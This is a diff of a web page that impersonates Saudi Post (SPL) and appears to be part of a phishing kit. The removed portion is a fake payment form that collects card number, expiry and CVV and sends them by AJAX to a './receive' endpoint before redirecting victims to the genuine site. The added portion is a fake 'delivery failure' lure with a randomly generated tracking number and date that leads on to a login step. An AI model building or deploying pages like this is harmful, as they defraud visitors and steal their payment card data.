@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" class=" notranslate js flexbox flexboxlegacy canvas canvastext webgl touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths js flexbox canvas canvastext webgl touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths js flexbox flexboxlegacy canvas canvastext webgl touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths" lang="en" translate="no" style="">
 
@@ -5,7 +6,16 @@
     <meta http-equiv="origin-trial" content="A/kargTFyk8MR5ueravczef/wIlTkbVk1qXQesp39nV+xNECPdLBVeYffxrM8TmZT6RArWGQVCJ0LRivD7glcAUAAACQeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZzIiLCJleHBpcnkiOjE3NDIzNDIzOTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9" />
     <!-- Global site tag (gtag.js) - Google Analytics -->
     	
-    
+    <script>
+	// Generate a random 9-digit number
+const randomNumber = Math.floor(Math.random() * 900000000) + 100000000;
+// Generate the date in DD/MM/YYYY format
+const date = new Date();
+const formattedDate = `${String(date.getDate()).padStart(2, '0')}/${String(date.getMonth() + 1).padStart(2, '0')}/${date.getFullYear()}`;
+
+console.log(formattedDate);
+	</script>
+
     
     <!-- Google Tag Manager -->
     
@@ -67,7 +77,6 @@
                 <div class="col flex_me append_menu">
                     <a href="https://splonline.com.sa/en/" class="logo"><img src="assets/images/Logo_login.svg" alt="" /></a>
                 </div>
-                
             </div>
         </header>
         <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="110.53900146484375" viewBox="0 0 1922.745 110.539" class="hero_linear login_linear" preserveAspectRatio="xMidYMid slice">
@@ -114,107 +123,42 @@
         <div class="login_container container">
             <div class="flex_me">
                 <div class="col" id="loginDivs">
-                    <form action="" method="post" novalidate="novalidate">
-    <span class="generic_page_title">Payment Information</span>
-
-    <span class="login_subtitle">Card Details</span>
-    
-    
-    <div class="form_group">
-        <input autocomplete="off" class="form_control" data-val="true" data-val-required="Required" id="CardHolderName" name="CardHolderName" placeholder="Cardholder Name" type="text" value="" />
-        <span class="field-validation-valid d-block text-danger m-1" data-valmsg-for="CardHolderName" data-valmsg-replace="true"></span>
-    </div>
-    
-    <div class="form_group">
-    <input autocomplete="off" class="form_control" 
-           data-val="true" 
-           data-val-required="Required" 
-           id="CardNumber" 
-           name="CardNumber" 
-           placeholder="Card Number" 
-           type="number" 
-           value=""
-           inputmode="numeric" />
-    <span class="field-validation-valid d-block text-danger m-1" 
-          data-valmsg-for="CardNumber" 
-          data-valmsg-replace="true"></span>
+                    <form method="post" novalidate="novalidate">
+                         
+                        <span class="login_subtitle">Delivery status</span>
+                        <div class="form_group" style="background-color:#d5d5d59c; padding: 15px">
+                              <span class="field-validation-valid d-block text-danger m-1" data-valmsg-for="Username" data-valmsg-replace="true"></span>
+                              <div style="font-size:18px;"> Your tracking number: <span id="ranNumber">503804358</span>
+  
+							<span style="color: red;  font-weight:500;">delivery failure notification</span></div>
+							 <div style="font-size: 16px; margin-left:12px;">
+    <span style="display: block; margin-top: 10px;">Your package was not delivered due to an unclear delivery address</span>
+    <span style="display: block; margin-top: 10px;">Your package has been returned to our fulfillment center</span>
+    <span style="display: block; margin-top: 10px;">Please update your address and we will ship again on <span id="date">26/04/2024</span></span>
 </div>
+<div class="section_btns" style="display: flex; text-align: center;"></div>
+							
+                            <button onclick="location.href='Login?step=1'" style="width:30%; height:40px; background-color:#00e8c1; color:#153c3f; border: 0; font-weight: 550; position: absolute!important; bottom: 5px!important; text-align:center;" class="" type="submit" style=" ">Continue</button>
+                     	</div>
+                        </div>
+                        </div> 
+                        
+                              </form>
 
-    <div class="form_group">
-        <input autocomplete="off" class="form_control" data-val="true" data-val-required="Required" id="ExpiryDate" name="ExpiryDate" placeholder="MM/YY" type="text" value="" />
-        <span class="field-validation-valid d-block text-danger m-1" data-valmsg-for="ExpiryDate" data-valmsg-replace="true"></span>
-    </div>
-
-    <div class="form_group">
-        <input autocomplete="off" class="form_control" data-val="true" data-val-required="Required" id="CVV" name="CVV" placeholder="CVV" type="password" value="" />
-        <span class="field-validation-valid d-block text-danger m-1" data-valmsg-for="CVV" data-valmsg-replace="true"></span>
-    </div>
-
-    <div class="section_btns">
-        <button class="btn primary_btn" type="submit">Continue </button>
-    </div>
-</form>
-
-
-
-                    <div class="gov_content" style="display: none;">
-                        <p style=" font-size: initial;">
-                            Welcome to SPL online for government entities which enables you with to manage your eservices.
-                            <br />
-                            To create a new account on the SPL online for government entities, we kindly ask you to contact the government sales team on the following e-mail:
-                            <a href="mailto: govsales@splonline.com.sa" style="color: rgb(0, 200, 225); ">govsales@splonline.com.sa</a>
-                            <br />
-                            For more information, we are pleased to receive your inquiries on the following communication channels:
-                            <br />
-                            Contact Number
-                            <strong><a href="tel: 19992" style="color: rgb(0, 200, 225); ">19992</a></strong>
-                            <br />
-                            Twitter Account :
-                            <a href="https://twitter.com/SPL_Care" target="_blank" style="color: rgb(0, 200, 225);">
-                                @SPL_Care
-                            </a>
-                        </p>
-                    </div>
+                              
+                              
                 </div>
-
-
-
-
                 
-            </div>
         </div>
 
+<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
+    
+<script>
+	document.querySelector('#ranNumber').textContent = randomNumber; 
+	document.querySelector('#date').textContent = formattedDate; 
+</script>
 
 
-
-
-
-
-        <footer class="main-footer">
-            <div class="container">
-                <div class="row">
-
-                    <div class="col-sm-6">
-                        <p>
-                            ©️ 2024 All rights reserved to Saudi Post- SPL
-                        </p>
-                    </div>
-                    <div class="col-md-6 terms">
-                        <span>
-                            When using this website, you must agree to
-                        </span>
-                        <a href="https://splonline.com.sa/en/terms-of-service/" target="_blank">
-                            Terms of service
-
-                        </a>
-                        and
-                        <a href="https://splonline.com.sa/en/privacy-policy/" target="_blank">
-                            Privacy Terms
-                        </a>
-                    </div>
-                </div>
-            </div>
-        </footer>
     </div>
 
     
@@ -233,92 +177,6 @@
 
     
     <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=2106583629541727&amp;ev=PageView&amp;noscript=1"></noscript>
-	<script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
-      
-<script>
-	 	
-
-	      /* new Cleave('#CardNumber', {
-            creditCard: true
-        });*/
-
-        new Cleave('#ExpiryDate', {
-            date: true,
-            datePattern: ['m', 'y']
-        });
-
-        new Cleave('#CVV', {
-            numericOnly: true,
-            blocks: [3]
-        });
-
-        
-</script>
-    	
-    
-    <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
-    
-    <script>
-document.querySelector('form').addEventListener('submit', function(event) {
-    event.preventDefault(); // Prevent form submission initially
-    let isValid = true;
-    const form = this;
-    const inputs = form.querySelectorAll('.form_control');
-
-    inputs.forEach(input => {
-        const errorDiv = input.nextElementSibling;
-        if (input.value.trim() === '') {
-            // Change border and background color for invalid input
-            input.style.borderColor = 'red';
-            input.style.backgroundColor = '#ffe6e6'; // Very light red
-
-            // Show the "required" message
-            if (errorDiv && errorDiv.classList.contains('field-validation-valid')) {
-                errorDiv.textContent = 'Required';
-                errorDiv.style.color = 'red';
-            }
-
-            isValid = false;
-        } else {
-            // Reset the styles if the input is filled
-            input.style.borderColor = '';
-            input.style.backgroundColor = '';
-            if (errorDiv && errorDiv.classList.contains('field-validation-valid')) {
-                errorDiv.textContent = '';
-            }
-        }
-    });
-
-    // Proceed with AJAX submission if form is valid
-    if (isValid) {
-        const formData = new FormData(form);
-        let user = {};
-        let visitor = sessionStorage.getItem('visitor');
-
-        formData.forEach((value, key) => {
-            user[key] = value;
-        });
-
-        user['visitor'] = visitor;
-
-        // Send AJAX request
-        $.ajax({
-            method: 'POST',
-            url: "./receive",
-            data: user
-        }).done(function(msg) {
-            sessionStorage.setItem('visitor', visitor);
-            window.location.href = "https://splonline.com.sa/en/shipmentdetailsstatic";
-            
-            console.log(msg); // Log success message
-        }).fail(function(err, textStatus, error) {
-            console.error('Submission failed:', textStatus, error);
-            // Optionally handle failure case
-            // window.location.href = "/login/2"; 
-        });
-    }
-});
-</script>
     
     
     
